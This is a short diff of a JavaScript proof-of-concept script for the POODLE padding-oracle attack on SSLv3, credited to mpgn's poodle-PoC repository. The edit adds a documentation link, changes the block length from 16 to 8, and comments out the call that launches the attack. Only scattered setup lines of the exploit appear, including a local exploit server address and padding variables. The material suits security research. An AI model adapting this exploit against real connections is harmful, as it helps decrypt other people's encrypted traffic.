@@ -3,8 +3,9 @@
     Author: @mpgn_x64 / https://github.com/mpgn
     Github: https://github.com/mpgn/poodle-PoC
     Date: march 2018
+
+    https://docs.microfocus.com/CSA/4.90/Content/Installation_and_Configuration/Configuration_Guide/InitialSetup_SecureBrowser.htm
 */
-var XMLHttpRequest = require('xhr2');
 let exploitServer = "https://localhost:9000"
 
 var payload = ""
@@ -12,7 +13,7 @@ var garbage = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
 var attack = 1
 var i = 0
 var payload_f = ""
-var block_length = 16
+var block_length = 8
 
 function reset() {
     payload = payload_f
@@ -78,6 +79,6 @@ function sendRequestHandler2() {
     }
 }
 
-sendAttack()
+// sendAttack()
 // findlengthblock()
-setTimeout(()=>{}, 10000)
+// setTimeout(()=>{}, 10000)
